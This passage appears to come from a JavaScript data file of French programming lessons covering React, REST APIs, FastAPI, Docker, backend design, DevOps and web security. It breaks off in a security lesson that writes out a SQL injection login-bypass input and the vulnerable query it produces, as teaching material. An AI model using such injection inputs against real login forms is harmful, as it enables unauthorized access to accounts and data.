  { id: 1, nom: "Alice", email: "alice@ex.com", avatar: "👩" },
  { id: 2, nom: "Bob",   email: "bob@ex.com",   avatar: "👨" }
];

<ListeUtilisateurs utilisateurs={users} />
\`\`\`

## Rendu conditionnel

\`\`\`jsx
function Message({ estConnecte, nom }) {
  return (
    <div>
      {estConnecte ? (
        <p>Bienvenue, {nom} !</p>
      ) : (
        <p>Veuillez vous connecter.</p>
      )}

      {/* Afficher seulement si connecté */}
      {estConnecte && <button>Déconnexion</button>}
    </div>
  );
}
\`\`\``
      },
      {
        id: "react-hooks",
        title: "Hooks : useState et useEffect",
        duration: "15 min",
        content: `# Hooks : useState et useEffect

Les **hooks** permettent d'ajouter état et effets dans les composants.

## useState : gérer l'état local

\`\`\`jsx
import { useState } from 'react';

function Compteur() {
  const [compte, setCompte] = useState(0);  // valeur initiale = 0

  return (
    <div>
      <p>Compte : {compte}</p>
      <button onClick={() => setCompte(compte + 1)}>+1</button>
      <button onClick={() => setCompte(compte - 1)}>-1</button>
      <button onClick={() => setCompte(0)}>Réinitialiser</button>
    </div>
  );
}
\`\`\`

## useState avec objets et formulaires

\`\`\`jsx
function FormulaireInscription() {
  const [formData, setFormData] = useState({
    nom: '',
    email: '',
    motDePasse: ''
  });
  const [erreur, setErreur] = useState('');

  const handleChange = (e) => {
    setFormData({
      ...formData,           // garder les autres champs
      [e.target.name]: e.target.value  // mettre à jour le champ modifié
    });
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!formData.email.includes('@')) {
      setErreur('Email invalide');
      return;
    }
    console.log('Données:', formData);
  };

  return (
    <form onSubmit={handleSubmit}>
      <input name="nom" value={formData.nom} onChange={handleChange} placeholder="Nom" />
      <input name="email" value={formData.email} onChange={handleChange} placeholder="Email" />
      <input name="motDePasse" type="password" value={formData.motDePasse} onChange={handleChange} placeholder="Mot de passe" />
      {erreur && <p style={{color:'red'}}>{erreur}</p>}
      <button type="submit">S'inscrire</button>
    </form>
  );
}
\`\`\`

## useEffect : effets de bord

\`\`\`jsx
import { useState, useEffect } from 'react';

function ListePosts() {
  const [posts, setPosts] = useState([]);
  const [chargement, setChargement] = useState(true);

  // S'exécute après le rendu (et quand les dépendances changent)
  useEffect(() => {
    async function charger() {
      try {
        const res = await fetch('https://jsonplaceholder.typicode.com/posts?_limit=5');
        const données = await res.json();
        setPosts(données);
      } finally {
        setChargement(false);
      }
    }
    charger();
  }, []);  // [] = s'exécute UNE seule fois au montage

  if (chargement) return <p>Chargement...</p>;

  return (
    <ul>
      {posts.map(post => (
        <li key={post.id}>{post.title}</li>
      ))}
    </ul>
  );
}
\`\`\`

## Règles des hooks
- Ne jamais appeler un hook dans une condition ou une boucle
- Toujours appeler les hooks au niveau supérieur du composant
- Nommer les hooks personnalisés avec \`use\` (ex: \`useAuth\`, \`usePosts\`)`
      }
    ]
  },
  {
    id: "api-rest",
    category: "Backend",
    emoji: "📡",
    title: "APIs REST",
    description: "Concevoir et consommer des APIs web",
    level: "Intermédiaire",
    color: "#00D4AA",
    lessons: [
      {
        id: "api-concepts",
        title: "Concepts et méthodes HTTP",
        duration: "12 min",
        content: `# Concepts des APIs REST

Une **API REST** (REpresentational State Transfer) est une interface qui permet à des applications de communiquer entre elles via HTTP.

## Les méthodes HTTP

| Méthode | Action | Exemple |
|---------|--------|---------|
| \`GET\` | Lire des données | Récupérer la liste des articles |
| \`POST\` | Créer une ressource | Créer un nouvel utilisateur |
| \`PUT\` | Remplacer une ressource | Mettre à jour un profil entier |
| \`PATCH\` | Modifier partiellement | Changer seulement l'email |
| \`DELETE\` | Supprimer | Supprimer un commentaire |

## Codes de statut HTTP

\`\`\`
2xx — Succès
  200 OK           : Requête réussie
  201 Created      : Ressource créée
  204 No Content   : Succès sans données à retourner

4xx — Erreur du client
  400 Bad Request  : Données invalides envoyées
  401 Unauthorized : Non authentifié
  403 Forbidden    : Authentifié mais sans permission
  404 Not Found    : Ressource inexistante
  422 Unprocessable: Validation échouée

5xx — Erreur du serveur
  500 Internal Server Error : Bug côté serveur
  503 Service Unavailable   : Serveur surchargé
\`\`\`

## Structure d'une bonne API REST

\`\`\`
# URLs en noms pluriels, pas en verbes
GET    /api/articles          → liste des articles
POST   /api/articles          → créer un article
GET    /api/articles/42       → article spécifique
PUT    /api/articles/42       → remplacer l'article 42
PATCH  /api/articles/42       → modifier partiellement
DELETE /api/articles/42       → supprimer

# Relations imbriquées
GET    /api/articles/42/commentaires    → commentaires de l'article 42
POST   /api/articles/42/commentaires   → ajouter un commentaire

# Filtres via query params
GET /api/articles?auteur=1&publié=true&page=2&limite=10
\`\`\`

## Format JSON standard

\`\`\`json
// Réponse succès (liste)
{
  "données": [...],
  "total": 150,
  "page": 1,
  "limite": 10
}

// Réponse succès (objet)
{
  "id": 42,
  "titre": "Mon article",
  "auteur": { "id": 1, "nom": "Alice" },
  "créé_le": "2024-01-15T10:30:00Z"
}

// Réponse erreur
{
  "erreur": "NOT_FOUND",
  "message": "Article introuvable",
  "code": 404
}
\`\`\``
      },
      {
        id: "api-fastapi",
        title: "Créer une API avec FastAPI",
        duration: "15 min",
        content: `# Créer une API avec FastAPI

FastAPI est un framework Python moderne, rapide et très bien documenté.

## Installation et démarrage

\`\`\`bash
pip install fastapi uvicorn

# Lancer le serveur
uvicorn main:app --reload
# Docs auto : http://localhost:8000/docs
\`\`\`

## API de base

\`\`\`python
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from typing import Optional

app = FastAPI()

# Modèle de données (validation automatique)
class Article(BaseModel):
    titre: str
    contenu: str
    publié: bool = False

# "Base de données" en mémoire (exemple)
articles_db = {}
compteur = 0

# GET : liste
@app.get("/articles")
async def lister_articles():
    return list(articles_db.values())

# GET : un article
@app.get("/articles/{article_id}")
async def obtenir_article(article_id: int):
    if article_id not in articles_db:
        raise HTTPException(status_code=404, detail="Article introuvable")
    return articles_db[article_id]

# POST : créer
@app.post("/articles", status_code=201)
async def créer_article(article: Article):
    global compteur
    compteur += 1
    articles_db[compteur] = {"id": compteur, **article.dict()}
    return articles_db[compteur]

# PATCH : modifier
@app.patch("/articles/{article_id}")
async def modifier_article(article_id: int, données: dict):
    if article_id not in articles_db:
        raise HTTPException(status_code=404, detail="Article introuvable")
    articles_db[article_id].update(données)
    return articles_db[article_id]

# DELETE : supprimer
@app.delete("/articles/{article_id}", status_code=204)
async def supprimer_article(article_id: int):
    if article_id not in articles_db:
        raise HTTPException(status_code=404, detail="Article introuvable")
    del articles_db[article_id]
\`\`\`

## Authentification par token

\`\`\`python
from fastapi import Depends
from fastapi.security import OAuth2PasswordBearer

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="/auth/login")

async def utilisateur_actuel(token: str = Depends(oauth2_scheme)):
    # Vérifier le token JWT ici
    payload = vérifier_jwt(token)
    if not payload:
        raise HTTPException(status_code=401, detail="Token invalide")
    return payload

# Endpoint protégé
@app.get("/profil")
async def mon_profil(user = Depends(utilisateur_actuel)):
    return {"email": user["email"]}
\`\`\`

## À retenir
- FastAPI génère automatiquement la doc sur \`/docs\`
- Pydantic valide les données d'entrée automatiquement
- \`Depends()\` gère l'injection de dépendances (auth, DB, etc.)
- Préfixe \`async\` pour toutes les fonctions pour la performance`
      }
    ]
  },
  {
    id: "docker",
    category: "Backend",
    emoji: "🐳",
    title: "Docker",
    description: "Conteneuriser et déployer ses applications",
    level: "Intermédiaire",
    color: "#2496ED",
    lessons: [
      {
        id: "docker-bases",
        title: "Images et conteneurs",
        duration: "12 min",
        content: `# Docker : Conteneuriser ses applications

Docker permet d'empaqueter une application avec toutes ses dépendances dans un **conteneur** portable.

## Concepts clés

- **Image** : Le "plan" d'un conteneur (fichier immuable)
- **Conteneur** : Une instance en cours d'exécution d'une image
- **Dockerfile** : Instructions pour construire une image
- **Docker Hub** : Registre d'images publiques

## Commandes de base

\`\`\`bash
# Télécharger une image
docker pull python:3.11-slim

# Lancer un conteneur
docker run python:3.11-slim python --version

# Lancer en mode interactif
docker run -it python:3.11-slim bash

# Lister les conteneurs en cours
docker ps

# Lister TOUS les conteneurs (dont arrêtés)
docker ps -a

# Arrêter / supprimer
docker stop mon-conteneur
docker rm mon-conteneur

# Lister les images
docker images

# Supprimer une image
docker rmi python:3.11-slim
\`\`\`

## Dockerfile : construire son image

\`\`\`dockerfile
# Image de base
FROM python:3.11-slim

# Dossier de travail dans le conteneur
WORKDIR /app

# Copier les dépendances en premier (cache Docker)
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Copier le reste du code
COPY . .

# Port exposé par l'application
EXPOSE 8000

# Commande de démarrage
CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]
\`\`\`

\`\`\`bash
# Construire l'image
docker build -t mon-api:latest .

# Lancer l'API sur le port 8000
docker run -p 8000:8000 mon-api:latest

# Lancer en arrière-plan
docker run -d -p 8000:8000 --name mon-api mon-api:latest

# Voir les logs
docker logs mon-api
docker logs -f mon-api  # suivre en temps réel
\`\`\`

## Variables d'environnement

\`\`\`bash
# Passer des variables au lancement
docker run -e DATABASE_URL=postgresql://... -e SECRET_KEY=xyz mon-api

# Depuis un fichier .env
docker run --env-file .env mon-api
\`\`\`

## .dockerignore : exclure des fichiers

\`\`\`
# .dockerignore
__pycache__/
*.pyc
.env
venv/
node_modules/
.git/
*.md
\`\`\``
      },
      {
        id: "docker-compose",
        title: "Docker Compose",
        duration: "12 min",
        content: `# Docker Compose : Orchestrer plusieurs services

Compose permet de définir et lancer plusieurs conteneurs ensemble (app + base de données + cache, etc.)

## docker-compose.yml de base

\`\`\`yaml
version: '3.8'

services:
  # L'application backend
  api:
    build: ./backend
    ports:
      - "8000:8000"
    environment:
      - DATABASE_URL=postgresql://user:pass@db:5432/nexus
      - SECRET_KEY=ma-clé-secrète
    depends_on:
      - db
    volumes:
      - ./backend:/app  # hot reload en développement

  # Base de données PostgreSQL
  db:
    image: postgres:15-alpine
    environment:
      - POSTGRES_USER=user
      - POSTGRES_PASSWORD=pass
      - POSTGRES_DB=nexus
    volumes:
      - postgres_data:/var/lib/postgresql/data  # persistance des données
    ports:
      - "5432:5432"  # optionnel, pour accès local

  # Frontend
  frontend:
    build: ./frontend
    ports:
      - "3000:3000"
    environment:
      - VITE_API_URL=http://localhost:8000

volumes:
  postgres_data:  # volume nommé pour persister les données
\`\`\`

## Commandes Compose

\`\`\`bash
# Démarrer tous les services
docker compose up

# En arrière-plan
docker compose up -d

# Reconstruire les images si Dockerfile modifié
docker compose up --build

# Arrêter
docker compose down

# Arrêter ET supprimer les volumes (⚠️ perte de données)
docker compose down -v

# Voir les logs de tous les services
docker compose logs

# Logs d'un service spécifique
docker compose logs api -f

# Exécuter une commande dans un service
docker compose exec api bash
docker compose exec db psql -U user nexus
\`\`\`

## Profils pour dev/prod

\`\`\`yaml
services:
  api:
    build: .
    # ...

  # Seulement en développement
  adminer:
    image: adminer
    ports:
      - "8080:8080"
    profiles:
      - dev

  # Seulement en production
  nginx:
    image: nginx:alpine
    profiles:
      - prod
\`\`\`

\`\`\`bash
# Lancer avec profil dev
docker compose --profile dev up
\`\`\`

## À retenir
- \`depends_on\` garantit l'ordre de démarrage
- Les services se trouvent par leur **nom** dans le réseau Compose
- Les volumes nommés persistent entre les redémarrages`
      }
    ]
  },
  {
    id: "architecture-backend",
    category: "Backend",
    emoji: "🏗️",
    title: "Architecture Backend",
    description: "Comment fonctionne un serveur, une API, une base de données",
    level: "Intermédiaire",
    color: "#F59E0B",
    lessons: [
      {
        id: "backend-fonctionnement",
        title: "Comment fonctionne un backend ?",
        duration: "12 min",
        content: `# Comment fonctionne un backend ?

Un **backend** est la partie invisible d'une application : le serveur, la logique métier et la base de données. L'utilisateur ne le voit jamais, mais c'est lui qui fait tout le travail.

## L'architecture client-serveur

\`\`\`
Navigateur (client)          Serveur (backend)           Base de données
       │                            │                            │
       │  GET /api/articles ──────► │                            │
       │                            │  SELECT * FROM articles ──►│
       │                            │                   ◄─────── │ données
       │  ◄────── JSON [{...}] ──── │                            │
\`\`\`

**Ce qui se passe en détail :**
1. Le navigateur envoie une **requête HTTP** (GET, POST, etc.)
2. Le serveur reçoit la requête et l'analyse
3. Le serveur exécute la **logique métier** (vérifier les droits, calculer, etc.)
4. Le serveur interroge la **base de données** si besoin
5. Le serveur retourne une **réponse** (souvent du JSON)

## Les couches d'un backend

\`\`\`
┌─────────────────────────────────────┐
│           Couche Routage            │  ← Qui gère quelle URL ?
│  GET /users → UserController        │
├─────────────────────────────────────┤
│         Couche Contrôleurs          │  ← Orchestration
│  Reçoit la requête, retourne réponse│
├─────────────────────────────────────┤
│           Couche Services           │  ← Logique métier pure
│  "Un user peut avoir max 5 projets" │
├─────────────────────────────────────┤
│          Couche Repository          │  ← Accès aux données
│  Toutes les requêtes SQL ici        │
├─────────────────────────────────────┤
│        Base de données              │  ← Stockage persistant
└─────────────────────────────────────┘
\`\`\`

## Pourquoi séparer en couches ?

- **Routage** : centralise les URLs, facile à lire d'un coup d'œil
- **Contrôleur** : ne contient QUE la gestion requête/réponse
- **Service** : logique métier testable indépendamment du HTTP
- **Repository** : si tu changes de base de données, tu ne touches que cette couche

## Exemple concret : inscription d'un utilisateur

\`\`\`
1. POST /auth/register  →  Routeur
2. Routeur              →  AuthController.register(requête)
3. Controller           →  AuthService.createUser(email, password)
4. Service              →  vérifie si email déjà utilisé
5. Service              →  hash le mot de passe
6. Service              →  UserRepository.save(user)
7. Repository           →  INSERT INTO users...
8. Remonte              →  retourne le token JWT
\`\`\`

## Synchrone vs Asynchrone

**Synchrone** : le serveur attend la réponse avant de continuer → bloque tout si la DB est lente

**Asynchrone** : le serveur peut gérer d'autres requêtes en attendant → indispensable pour gérer des centaines de requêtes simultanées

C'est pourquoi Python/FastAPI et Node.js utilisent \`async/await\`.`
      },
      {
        id: "backend-authentification",
        title: "Authentification et sessions",
        duration: "14 min",
        content: `# Authentification et sessions

L'authentification répond à : **"Qui est cet utilisateur ?"**
L'autorisation répond à : **"A-t-il le droit de faire ça ?"**

## Les 3 grandes approches

### 1. Sessions (approche classique)

\`\`\`
Login → POST /login (email+mdp)
Serveur vérifie → crée session "abc123" en DB
Réponse → Set-Cookie: sid=abc123

Requête suivante → Cookie: sid=abc123
Serveur cherche la session en DB → valide → OK
\`\`\`

**Avantages** : révocation instantanée
**Inconvénients** : le serveur doit stocker les sessions (problème en multi-serveurs)

### 2. JWT — JSON Web Tokens (approche moderne)

\`\`\`
Login → serveur crée un token signé :
{ userId: 42, exp: demain }  →  signé avec une clé secrète

Requête suivante → Authorization: Bearer {token}
Serveur vérifie la signature → pas besoin de DB !
\`\`\`

**Structure d'un JWT** : 3 parties séparées par des points
\`\`\`
header.payload.signature
eyJhbGci...  .eyJ1c2VySWQiOjQyfQ  .SflKxwRJ...
(algo)         (données, lisible)    (vérifie intégrité)
\`\`\`

**Avantages** : sans état, multi-serveurs, mobile-friendly
**Inconvénients** : impossible de révoquer avant expiration → utiliser une courte durée (1h) + refresh token

### 3. OAuth2 / "Se connecter avec Google"

\`\`\`
Ton app → redirige vers Google
Google → user se connecte → retourne un code
Ton serveur échange le code contre un token Google
→ récupère email/profil → crée session dans ton app
\`\`\`

## Hachage des mots de passe

\`\`\`
❌ JAMAIS stocker en clair : "motdepasse123"
❌ JAMAIS MD5/SHA1 (trop rapides, attaquables)

✅ bcrypt/argon2 :
"motdepasse123"  →  bcrypt  →  "$2b$12$xyz..."  ← stocké en DB

bcrypt est VOLONTAIREMENT lent (pour ralentir les attaques brute-force)
\`\`\`

## Bonnes pratiques

- Tokens JWT : expiration courte (1h) + refresh token longue durée
- HTTPS obligatoire (jamais HTTP en prod)
- Rate limiting sur les endpoints de login (anti-brute force)
- Ne jamais logger les mots de passe ou tokens`
      },
      {
        id: "backend-cache",
        title: "Cache et performance",
        duration: "12 min",
        content: `# Cache et performance

Le cache est une copie temporaire des données pour éviter de recalculer ou requêter la DB à chaque fois.

## Pourquoi cacher ?

\`\`\`
Sans cache :
100 users demandent la page d'accueil
→ 100 requêtes SQL identiques "SELECT top articles..."
→ DB surchargée, réponse lente

Avec cache (Redis) :
1er user → requête SQL → résultat stocké en cache
99 autres → lu depuis le cache → réponse en 1ms, DB tranquille
\`\`\`

## Les niveaux de cache

\`\`\`
1. Cache navigateur   → Headers HTTP (Cache-Control, ETag)
                        Ressources statiques (images, CSS, JS)

2. CDN                → Cache géographiquement distribué
                        Cloudflare, AWS CloudFront

3. Cache applicatif   → Redis, Memcached
                        Résultats de requêtes DB, calculs coûteux

4. Cache DB           → Buffer pool (PostgreSQL, MySQL)
                        Données fréquentes en RAM
\`\`\`

## Redis : le cache le plus répandu

Redis stocke les données **en RAM** → lecture en < 1ms

\`\`\`
Stratégie Cache-Aside :

1. Requête arrive : "articles populaires ?"
2. Redis → MISS (pas encore en cache)
3. Requête SQL → résultat
4. Stocke dans Redis, TTL = 5 minutes
5. Prochaine requête → HIT → depuis Redis directement
\`\`\`

## Le problème de l'invalidation

> "Il y a deux problèmes difficiles en informatique : nommer les choses et invalider le cache."

Si tu modifies des données, tu dois mettre à jour ou supprimer le cache correspondant, sinon les utilisateurs voient des données obsolètes.

\`\`\`
Solutions :
1. TTL court  →  incohérence maximale de X secondes
2. Invalidation manuelle  →  plus complexe mais précis
3. Write-through  →  met à jour le cache ET la DB simultanément
\`\`\`

## Indicateurs à surveiller

- **Hit rate** : % de requêtes depuis le cache (objectif > 90%)
- **Latence P99** : 99% des requêtes sous X ms
- **Éviction** : données supprimées du cache par manque de mémoire`
      }
    ]
  },
  {
    id: "conception-systeme",
    category: "Fondamentaux",
    emoji: "🎨",
    title: "Conception Système",
    description: "Concevoir des systèmes scalables et robustes",
    level: "Avancé",
    color: "#8B5CF6",
    lessons: [
      {
        id: "scalabilite",
        title: "Scalabilité : comment gérer la croissance",
        duration: "15 min",
        content: `# Scalabilité

La scalabilité est la capacité d'un système à gérer une charge croissante.

## Scaling vertical vs horizontal

\`\`\`
Vertical (Scale Up)              Horizontal (Scale Out)
───────────────────              ──────────────────────
[Serveur très puissant]          [S1] [S2] [S3] [S4]
CPU: 64 cœurs, RAM: 256 Go            ↑
→ Simple mais limité             Load Balancer
→ Point de défaillance unique    → Illimité mais complexe
                                 → Résilient (si S1 tombe, S2-4 OK)
\`\`\`

**En pratique** : on commence par le vertical (simple), puis horizontal quand nécessaire.

## Le Load Balancer

Distribue le trafic entre plusieurs serveurs.

\`\`\`
Internet → [Load Balancer] → [S1] [S2] [S3]

Algorithmes :
- Round Robin     : S1 → S2 → S3 → S1...
- Least Conn      : vers le moins chargé
- IP Hash         : même client → même serveur
\`\`\`

## Le problème de l'état partagé

\`\`\`
❌ Problème :
Client → Serveur 1 (login, session sur S1)
Client → Serveur 2 (pas de session → déconnecté !)

✅ Solutions :
1. Sessions dans Redis (partagé entre tous les serveurs)
2. JWT (token sans état, chaque serveur valide)
3. Sticky sessions (même client → même serveur)
\`\`\`

## La base de données : le goulot d'étranglement

\`\`\`
Read Replicas :
Primary DB (écritures)
    │ réplication
    ├── Replica 1 (lectures)
    └── Replica 2 (lectures)

→ Divise la charge de lecture par le nombre de replicas
\`\`\`

## Les nombres à connaître

\`\`\`
Opération                     Temps approx.
──────────────────────────    ─────────────
Accès RAM                     ~100 ns
Lecture Redis (réseau local)  ~1 ms
Requête DB simple (indexée)   ~5 ms
Requête DB complexe           ~100 ms
Appel API externe             ~200-500 ms
\`\`\`

Ces chiffres guident tes décisions : 50 requêtes DB pour une page = problème.`
      },
      {
        id: "microservices",
        title: "Monolithe vs Microservices",
        duration: "14 min",
        content: `# Monolithe vs Microservices

## Le monolithe

Une seule application qui contient tout.

\`\`\`
┌─────────────────────────────────────┐
│         Application Monolithe        │
│  [Auth] [Articles] [Paiement] [Mail] │
└──────────────────┬──────────────────┘
              [1 seule DB]
\`\`\`

**Avantages :**
- Simple à développer et déployer au début
- Pas de latence réseau entre modules
- Débogage facile
- Transactions DB simples

**Inconvénients :**
- Un bug peut faire tomber TOUT le système
- Difficile de scaler un seul module
- Déploiement = tout redéployer

## Les microservices

Chaque fonctionnalité est un service indépendant.

\`\`\`
[API Gateway]
     │
     ├── [Service Auth] → DB1
     ├── [Service Posts] → DB2
     ├── [Service Paiement] → DB3
     └── [Service Emails] → Queue
\`\`\`

**Avantages :**
- Chaque service déployable indépendamment
- Scaler uniquement ce qui est sous charge
- Une panne isole un seul service

**Inconvénients :**
- Complexité opérationnelle élevée
- Latence réseau entre services
- Transactions distribuées très complexes
- Nécessite du DevOps mature (Kubernetes...)

## La règle d'or : commencer par le monolithe

\`\`\`
Startup → Monolithe (simple, rapide à itérer)
Croissance → Monolithe modulaire (modules bien séparés)
Grande échelle → Microservices (si vraiment nécessaire)

Netflix, Uber : microservices (des millions d'users)
La plupart des apps : monolithe suffisant
\`\`\`

## Communication entre services

\`\`\`
Synchrone (HTTP/gRPC) :
Service A → Service B (attend réponse)
→ Pour : actions qui nécessitent une réponse immédiate

Asynchrone (Message Queue) :
Service A → Queue → Service B (traite quand libre)
→ Pour : emails, notifications, traitements longs
\`\`\``
      },
      {
        id: "conception-bdd",
        title: "Concevoir une base de données",
        duration: "14 min",
        content: `# Concevoir une base de données

La conception de la DB est l'une des décisions les plus importantes. Mal conçue, elle freine tout le développement.

## Pas de redondance

\`\`\`
❌ Mauvais : même info répétée
commandes : | id | client_email | client_ville |
            | 1  | alice@ex.com | Paris        |
            | 2  | alice@ex.com | Paris        |  ← Paris répété
            | 3  | alice@ex.com | Paris        |  ← Si Alice déménage ?

✅ Correct : séparer en tables
commandes(id, client_id, ...)
clients(id, email, ville, ...)
\`\`\`

## Les relations

\`\`\`
1-à-1 :  Un user a un profil
         users.id ──── profils.user_id

1-à-N :  Un user a N commandes
         users.id ──┬─ commandes.user_id
                    ├─ commandes.user_id
                    └─ commandes.user_id

N-à-N :  Un article a N tags, un tag a N articles
         articles ──── articles_tags (table de jonction) ──── tags
\`\`\`

## SQL vs NoSQL

\`\`\`
SQL (PostgreSQL, MySQL)            NoSQL (MongoDB, Redis...)
──────────────────────             ──────────────────────────
✅ Données structurées             ✅ Données variables / flexibles
✅ Transactions ACID               ✅ Grande échelle horizontale
✅ Requêtes complexes (JOINs)      ✅ Lecture/écriture ultra rapide
✅ 99% des applis web              ✅ Logs, cache, sessions, analytics

Règle : commence par PostgreSQL.
Passe à NoSQL uniquement si tu as un besoin spécifique.
\`\`\`

## Index : la clé de la performance

\`\`\`
Sans index :           Avec index :
Chercher par email     Chercher par email
→ Scan toute la table  → Cherche dans l'arbre B
→ 1M lignes = lent     → ~20 comparaisons
   O(n)                   O(log n)

Quand indexer :
✅ Colonnes dans les WHERE fréquents
✅ Colonnes dans les JOIN
✅ Colonnes dans les ORDER BY

Quand NE PAS indexer :
❌ Colonnes rarement filtrées
❌ Tables très petites
❌ Booléens (trop peu de valeurs distinctes)
\`\`\``
      }
    ]
  },
  {
    id: "devops",
    category: "DevOps",
    emoji: "🚀",
    title: "DevOps",
    description: "CI/CD, déploiement, monitoring et infrastructure",
    level: "Intermédiaire",
    color: "#10B981",
    lessons: [
      {
        id: "devops-cicd",
        title: "CI/CD : automatiser les déploiements",
        duration: "14 min",
        content: `# CI/CD : automatiser les déploiements

**CI** (Continuous Integration) = vérifier automatiquement chaque modification de code
**CD** (Continuous Delivery/Deployment) = déployer automatiquement en production

## Sans CI/CD (le chaos)

\`\`\`
Dev A commit → "ça marche sur ma machine"
Dev B commit → "ça marche sur ma machine"
Merge → 💥 Le serveur de prod plante
→ 3h pour trouver le bug, rollback manuel, stress dans l'équipe
\`\`\`

## Avec CI/CD

\`\`\`
Dev commit → GitHub → Pipeline automatique :
  1. Tests unitaires              (~2 min)
  2. Tests d'intégration          (~5 min)
  3. Analyse de sécurité          (~2 min)
  4. Build de l'application       (~3 min)
  5. Déploiement en staging       (~2 min)
  6. Tests end-to-end             (~5 min)
  7. ✅ Déploiement en production (~1 min)

Si une étape échoue → pipeline arrêté, notification au dev
\`\`\`

## Un pipeline GitHub Actions

\`\`\`yaml
name: CI/CD

on:
  push:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: pip install -r requirements.txt
      - run: pytest tests/ -v

  deploy:
    needs: test   # ← déploie SEULEMENT si les tests passent
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - name: Déployer
        run: curl -X POST \${{ secrets.RENDER_DEPLOY_HOOK }}
\`\`\`

## Les environnements

\`\`\`
Développement      Staging (recette)      Production
─────────────      ─────────────────      ──────────
Poste du dev       Copie de la prod       Users réels
Données de test    Tests finaux ici       Stabilité max

Flux : dev → commit → tests CI → staging → validation → prod
\`\`\`

## Les stratégies de déploiement

\`\`\`
Blue-Green :
Prod actuelle (Blue v1.0) ← tout le trafic
Nouvelle (Green v1.1) déployée en parallèle
→ Bascule le trafic vers Green
→ Problème ? Rebascule vers Blue instantanément

Canary :
v1.0 ← 90% du trafic
v1.1 ← 10% du trafic ("cobayes")
→ Surveille les métriques → augmente progressivement
\`\`\`

## Bonnes pratiques

- Automatise TOUT : build, tests, déploiement
- Ne jamais déployer manuellement en prod
- Toujours avoir un rollback rapide (< 5 min)`
      },
      {
        id: "devops-monitoring",
        title: "Monitoring et observabilité",
        duration: "12 min",
        content: `# Monitoring et observabilité

Sans monitoring, tu découvres les pannes quand les utilisateurs se plaignent.

## Les 3 piliers

\`\`\`
1. MÉTRIQUES
   Données numériques dans le temps
   → CPU: 45%, RAM: 2.3 Go, req/sec: 1200
   → Outil : Prometheus + Grafana

2. LOGS
   Événements textuels horodatés
   → "2024-01-15 14:23 ERROR DB connection failed"
   → Outil : ELK Stack, Loki, Datadog

3. TRACES
   Suivi d'une requête à travers tous les services
   → Requête → Auth (12ms) → Users (45ms) → DB (8ms) = 65ms total
   → Outil : Jaeger, Zipkin
\`\`\`

## Les métriques essentielles

\`\`\`
Infrastructure :
- CPU usage       → > 80% = problème
- Memory usage    → > 90% = critique
- Disk usage      → > 85% = alerte

Application :
- Request rate    → requêtes/seconde
- Error rate      → % de réponses 5xx (objectif < 0.1%)
- Latence P50/P95/P99

Base de données :
- Query duration  → requêtes lentes (> 1s = problème)
- Connection pool → nb de connexions actives
\`\`\`

## Les SLOs (Service Level Objectives)

\`\`\`
Disponibilité :
99%     = 3.65 jours de downtime/an    (startup)
99.9%   = 8.7 heures de downtime/an   (standard)
99.99%  = 52 minutes de downtime/an   (e-commerce, SaaS)
99.999% = 5 minutes de downtime/an    (bancaire, médical)

Latence :
P50 < 100ms  (la moitié des requêtes)
P95 < 500ms  (95% des requêtes)
P99 < 2s     (99% des requêtes)
\`\`\`

## Bons logs vs mauvais logs

\`\`\`
✅ Bon log :
{
  "timestamp": "2024-01-15T14:23:01Z",
  "level": "ERROR",
  "service": "auth",
  "user_id": 42,
  "error": "DB timeout after 5000ms",
  "request_id": "req-789xyz"
}

❌ Mauvais logs :
"Error occurred"        ← aucune info
"user logged in"        ← qui ? quand ?
"password=secret123"    ← NE JAMAIS logger les données sensibles
\`\`\``
      },
      {
        id: "devops-infrastructure",
        title: "Infrastructure et Cloud",
        duration: "13 min",
        content: `# Infrastructure et Cloud

## Les modèles de déploiement

\`\`\`
On-Premise          IaaS                 PaaS              SaaS
(ton serveur)       (VM dans le cloud)   (plateforme gérée) (logiciel)
────────────        ──────────────────   ─────────────────  ─────────
Tu gères TOUT       Tu gères l'OS        Tu gères ton app  Tu utilises
                    et ton app           le reste est géré

Ex : serveur perso  AWS EC2, GCP VMs     Heroku, Render,    Gmail, Slack
                                         Vercel, Railway
\`\`\`

## Services Cloud essentiels (AWS)

\`\`\`
Calcul :
  EC2       → Machines virtuelles
  Lambda    → Fonctions serverless (payer à l'usage)
  ECS/EKS   → Conteneurs Docker orchestrés

Stockage :
  S3        → Fichiers (images, vidéos, backups)
  RDS       → Base de données gérée (PostgreSQL, MySQL)
  ElastiCache → Redis/Memcached géré

Réseau :
  Route 53  → DNS
  CloudFront → CDN mondial
  API Gateway → Proxy pour tes APIs

Sécurité :
  IAM       → Gestion des accès et permissions
  ACM       → Certificats SSL gratuits
\`\`\`

## Serverless

\`\`\`
Serveur traditionnel :          Serverless (Lambda, Vercel Functions) :
──────────────────────          ──────────────────────────────────────
Tourne 24h/24                   S'exécute à la demande
Tu paies le serveur idle        Tu paies par exécution (souvent gratuit)
Tu gères OS, updates            Le provider gère tout
Scale manuel                    Scale automatique

Limites serverless :
- Cold start (~200ms pour la première invocation)
- Pas d'état persistant entre les appels
- Timeout limité (15min sur Lambda)
\`\`\`

## Infrastructure as Code (IaC)

Définir l'infrastructure comme du code, versionnable et reproductible.

\`\`\`hcl
# Terraform : créer une instance + DB en quelques lignes
resource "aws_instance" "web" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t3.micro"
}

resource "aws_db_instance" "db" {
  engine         = "postgres"
  instance_class = "db.t3.micro"
}
\`\`\`

**Avantages :**
- Reproductible (recréer l'infra en 5 min)
- Versionné dans Git (historique des changements)
- Évite les erreurs de configuration manuelle`
      }
    ]
  },
  {
    id: "securite-web",
    category: "Sécurité",
    emoji: "🔐",
    title: "Sécurité Web",
    description: "Comprendre et prévenir les attaques courantes",
    level: "Intermédiaire",
    color: "#EF4444",
    lessons: [
      {
        id: "owasp-top10",
        title: "Les vulnérabilités les plus courantes",
        duration: "15 min",
        content: `# Les vulnérabilités les plus courantes (OWASP Top 10)

## 1. Injection SQL

L'attaquant insère du SQL dans une entrée utilisateur pour manipuler la DB.

\`\`\`sql
-- URL : /login?email=admin'--&password=nimportequoi

-- Requête construite (VULNÉRABLE) :
SELECT * FROM users WHERE email='admin'--' AND password='...'
